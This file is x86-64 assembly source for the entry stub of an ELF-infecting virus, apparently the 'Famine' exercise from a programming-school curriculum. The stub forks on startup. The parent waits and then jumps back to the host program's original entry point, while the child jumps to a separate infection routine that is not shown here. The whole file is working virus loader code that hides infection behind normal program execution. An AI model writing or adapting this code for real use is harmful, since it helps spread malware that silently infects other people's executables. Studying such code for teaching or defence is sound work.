section.text:
	global _start:function

_start:
	call _inject; push addr to stack
%ifdef DEBUG
	db `....FAMINE....\n`, 0x0

_ft_strlen:
	mov rax, 0
	_count_char:
		cmp byte [rsi + rax], 0
		jz _end_count_char
		inc rax
		jmp _count_char
	_end_count_char:
	ret
%endif

_inject:
	pop rsi; pop addr from stack
	push rdx; save register

	mov rax, 57; fork
	syscall
	cmp rax, 0
	jz _fork

_wait:; parent -> run prg
	mov rax, 61; wait
	mov rdi, 0x0
	syscall

	sub rsi, 0x5; sub call instr

	sub rsi, [rel entry_inject]
	add rsi, [rel vaddr]; rdi at the offset of the program in mem

	mov rax, rsi
	add rax, [rel entry_prg]
	sub rax, [rel vaddr]; rax at the prev entry

	pop rdx
	jmp rax

_fork:; child -> run infect
%ifdef DEBUG
	_print:
		call _ft_strlen
		mov rdx, rax
		mov rax, 1 ; write
		mov rdi, 1
		syscall
%endif
	sub rsi, 0x5; sub call instr

	sub rsi, [rel entry_inject]
	add rsi, [rel vaddr]; rdi at the offset of the program in mem

	mov rax, rsi
	add rax, [rel entry_infect]
	sub rax, [rel vaddr]; rax at the infect entry
	jmp rax

_params:
	vaddr dq 0x0
	entry_inject dq 0x0
	entry_prg dq 0x0
	entry_infect dq 0x0
